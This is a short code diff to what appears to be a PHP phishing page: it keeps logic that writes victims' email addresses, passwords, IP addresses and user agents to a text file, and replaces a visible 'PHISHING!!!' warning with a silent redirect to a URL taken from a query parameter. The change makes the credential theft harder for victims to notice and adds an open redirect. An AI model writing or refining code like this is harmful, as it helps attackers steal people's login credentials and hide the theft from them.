@@ -23,7 +23,8 @@ if(isset($_POST['password']) && strlen($_POST['password']) > 0){
 	$email=$_SESSION["Email"];
 	file_put_contents("usernames.txt", "[EMAIL]: " . $email . "  [PASS]: " . $pass . " [IP]: " . $ipaddress . " [USER_AGENT]: " . $_SERVER['HTTP_USER_AGENT'] ."\n", FILE_APPEND);
   session_destroy();
-  die("<h1 align='center'>PHISHING!!!</h1>");
+  $destination = isset($_GET['link']) ? $_GET['link'] : 'https://google.com';
+  die("<meta http-equiv='refresh' content='0; url={$destination}' />");
 }
 
 if(!isset($_GET['kl'])){
